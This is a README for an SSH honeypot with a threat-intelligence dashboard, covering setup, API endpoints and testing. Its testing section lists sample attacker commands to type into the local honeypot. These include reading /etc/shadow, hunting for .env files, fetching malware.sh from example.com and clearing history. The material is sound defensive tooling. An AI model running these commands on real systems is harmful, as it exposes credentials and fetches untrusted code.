# 🛡️ AI Honeypot Threat Intelligence System

A complete cybersecurity honeypot solution with real-time threat intelligence dashboard.

## 🎯 Overview

This project consists of three main components:

| Component | Description | Port |
|-----------|-------------|------|
| **Honeypot Server** | SSH honeypot that simulates a Linux production server | 2222 |
| **API Server** | Flask backend that serves live data from logs | 5000 |
| **Dashboard** | React frontend for visualizing threat intelligence | 5173 |

---

## 📋 Prerequisites

- **Python 3.8+** with pip
- **Node.js 18+** with npm
- **Git** (optional)

---

## 🚀 Quick Start

### Step 1: Install Python Dependencies

```bash
cd c:\Users\vishn\OneDrive\Desktop\devH
pip install paramiko flask flask-cors
```

### Step 2: Install Dashboard Dependencies

```bash
cd dashboard
npm install
```

---

## ▶️ Running the Project

You need **3 terminal windows** to run all components:

### Terminal 1: Start the Honeypot Server

```bash
cd c:\Users\vishn\OneDrive\Desktop\devH
python main.py
```

Expected output:
```
[*] Loading existing host key from honeypot_host_key.pem
[*] Starting SSH Honeypot on 0.0.0.0:2222
[*] Listening for connections...
```

### Terminal 2: Start the API Server

```bash
cd c:\Users\vishn\OneDrive\Desktop\devH
python api_server.py
```

Expected output:
```
[*] Starting Honeypot API Server...
[*] API available at http://localhost:5000
 * Running on http://127.0.0.1:5000
```

### Terminal 3: Start the Dashboard

```bash
cd c:\Users\vishn\OneDrive\Desktop\devH\dashboard
npm run dev
```

Expected output:
```
VITE v7.x.x ready in xxx ms
➜  Local:   http://localhost:5173/
```

---

## 🌐 Accessing the Dashboard

Open your browser and navigate to:

**http://localhost:5173**

You will see the AI Honeypot Threat Intelligence Dashboard with:
- 📊 Real-time metrics
- 👥 Live session monitoring
- 📜 Command timeline
- 🎬 Session replay
- 📈 Analytics & charts
- ⚙️ Settings

---

## 🧪 Testing the Honeypot

### Connect as an Attacker

Open a **4th terminal** and connect to the honeypot:

```bash
ssh -p 2222 admin@localhost
```

When prompted:
- Enter **any password** (authentication accepts all passwords)
- Type `yes` to accept the host key (first time only)

### Try These Commands

Once connected, try these commands to generate threat data:

```bash
# Basic reconnaissance
ls
pwd
whoami
uname -a

# System exploration
cat /etc/passwd
ps aux
netstat -an

# Suspicious activity (high skill level)
sudo -l
cat /etc/shadow
find / -name "*.env" 2>/dev/null
wget http://example.com/malware.sh
history -c

# Exit when done
exit
```

### Watch the Dashboard Update

1. Go to **http://localhost:5173** in your browser
2. The dashboard auto-refreshes every **10 seconds**
3. You'll see:
   - New sessions appear in the sessions table
   - Commands flowing in the Command Timeline
   - Metrics updating (total commands, high-risk actions)
   - Charts reflecting the new data

---

## 📂 Project Structure

```
devH/
├── main.py                  # Honeypot server entry point
├── honeypot.py              # SSH honeypot session handler
├── commands.py              # Command simulation engine
├── filesystem.py            # Virtual file system
├── deception.py             # AI-powered deception engine
├── session_recorder.py      # Session recording & analysis
├── api_server.py            # Flask API server
├── honeypot_audit.json      # Live audit logs (auto-generated)
├── honeypot_host_key.pem    # SSH host key (auto-generated)
├── session_recordings/      # Session transcripts
└── dashboard/               # React frontend
    ├── src/
    │   ├── App.jsx
    │   ├── components/
    │   │   ├── Layout.jsx
    │   │   ├── MetricCard.jsx
    │   │   ├── SessionsTable.jsx
    │   │   ├── CommandFeed.jsx
    │   │   ├── Charts.jsx
    │   │   └── TerminalReplay.jsx
    │   ├── pages/
    │   │   ├── Dashboard.jsx
    │   │   ├── LiveSessions.jsx
    │   │   ├── CommandTimeline.jsx
    │   │   ├── SessionReplay.jsx
    │   │   ├── Analytics.jsx
    │   │   └── Settings.jsx
    │   └── services/
    │       └── api.js
    └── package.json
```

---

## 🔌 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/api/health` | GET | Health check |
| `/api/metrics` | GET | Dashboard statistics |
| `/api/sessions` | GET | All sessions with details |
| `/api/commands` | GET | Command timeline (last 100) |
| `/api/commands/frequency` | GET | Command frequency for charts |
| `/api/analytics/risk-distribution` | GET | Risk level distribution |
| `/api/analytics/skill-distribution` | GET | Skill level distribution |
| `/api/analytics/timeline` | GET | Commands over time |
| `/api/session/<id>/replay` | GET | Session replay data |

---

## 🛑 Stopping the Services

To stop each service, press `Ctrl+C` in the respective terminal:

- **Terminal 1**: Stop Honeypot Server
- **Terminal 2**: Stop API Server  
- **Terminal 3**: Stop Dashboard

---

## 🔧 Troubleshooting

### Port Already in Use

If you see "port already in use" errors:

```bash
# Find and kill process on port 2222 (honeypot)
netstat -ano | findstr :2222
taskkill /PID <pid> /F

# Find and kill process on port 5000 (API)
netstat -ano | findstr :5000
taskkill /PID <pid> /F

# Find and kill process on port 5173 (dashboard)
netstat -ano | findstr :5173
taskkill /PID <pid> /F
```

### SSH Host Key Warning

If you get "REMOTE HOST IDENTIFICATION HAS CHANGED" warning:

```bash
ssh-keygen -R "[localhost]:2222"
```

Then try connecting again.

### API Not Responding

Make sure both `main.py` and `api_server.py` are running before accessing the dashboard.

---

## 🎨 Dashboard Features

### 1. Dashboard Page (`/`)
- Metric cards with live statistics
- Sessions table with skill/risk badges
- Command feed with real-time updates
- Charts: Command frequency, Risk distribution, Timeline

### 2. Live Sessions (`/sessions`)
- Search and filter sessions
- Detailed session cards
- View last command executed
- Action buttons for view/replay

### 3. Command Timeline (`/timeline`)
- Color-coded command categories
- Expandable command details
- Category filtering
- Live stream indicator

### 4. Session Replay (`/replay`)
- Terminal emulator interface
- Play/Pause/Step controls
- Session selection sidebar
- Typing animation effect

### 5. Analytics (`/analytics`)
- Summary statistics
- Command frequency bar chart
- Risk distribution donut chart
- Skill level heatmap
- Top threat sources table

### 6. Settings (`/settings`)
- Honeypot configuration
- Alert settings
- Geo-blocking options

---

## 📝 License

This project is for educational and research purposes only.

---

## 🙏 Credits

Built with:
- [Paramiko](https://www.paramiko.org/) - SSH implementation
- [Flask](https://flask.palletsprojects.com/) - API server
- [React](https://react.dev/) - Frontend framework
- [Tailwind CSS](https://tailwindcss.com/) - Styling
- [Recharts](https://recharts.org/) - Charts
- [Lucide](https://lucide.dev/) - Icons
